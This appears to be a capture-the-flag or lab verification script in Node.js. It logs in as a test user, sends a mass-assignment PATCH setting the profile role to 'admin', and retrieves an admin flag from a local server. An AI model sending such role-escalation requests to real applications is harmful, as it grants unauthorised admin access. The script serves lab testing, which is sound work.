#!/usr/bin/env node
/** V2.4 Mass-assignment → admin flag */
import { extractFlag } from '../../../packages/shared/dist/index.js';

function arg(name, fallback) {
  const i = process.argv.indexOf(`--${name}`);
  return i >= 0 ? process.argv[i + 1] : fallback;
}

const base = arg('base', 'http://127.0.0.1:3011').replace(/\/$/, '');

const login = await fetch(`${base}/api/login`, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ username: 'alice', password: 'alice123' }),
}).then((r) => r.json());

const patched = await fetch(`${base}/api/profile`, {
  method: 'PATCH',
  headers: {
    Authorization: `Bearer ${login.token}`,
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({ role: 'admin' }),
}).then((r) => r.json());

console.log('role after patch', patched.user?.role);
const token = patched.token || login.token;
const flagRes = await fetch(`${base}/api/admin/flag`, {
  headers: { Authorization: `Bearer ${token}` },
});
const text = await flagRes.text();
console.log('flag status', flagRes.status, text);
const flag = extractFlag(text);
if (flagRes.status !== 200 || !flag) {
  console.error('FAIL: mass-assign blocked');
  process.exit(1);
}
console.log('FLAG', flag);
console.log('PASS V2.4 mass-assign');
